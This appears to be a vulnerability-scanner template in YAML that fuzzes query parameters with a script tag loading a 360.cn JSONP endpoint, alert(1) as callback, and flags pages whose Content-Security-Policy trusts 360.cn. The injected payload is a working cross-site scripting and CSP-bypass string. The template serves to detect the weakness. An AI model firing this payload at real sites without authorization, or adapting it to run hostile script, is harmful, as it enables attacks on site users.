id: 360cn-csp-xss

info:
  name: Content-Security-Policy Bypass via 360.cn
  author: DhiyaneshDK
  severity: high
  reference:
    - https://github.com/honoki/CSPBypass/blob/c7e4344226a58d96ad16a99d4446f81cd663264e/data.tsv#L208C19-L208C106
  metadata:
    verified: true
  tags: xss,csp-bypass,360cn

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'

    payloads:
      injection:
        - '<script src="https://zhike.help.360.cn/api/v1/robotWindow?callback=alert(1)-"></script>'

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{injection}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{injection}}"

      - type: word
        part: content_type
        words:
          - "text/html"

      - type: word
        part: content_security_policy
        words:
          - "360.cn"
          - "script-src"
        condition: and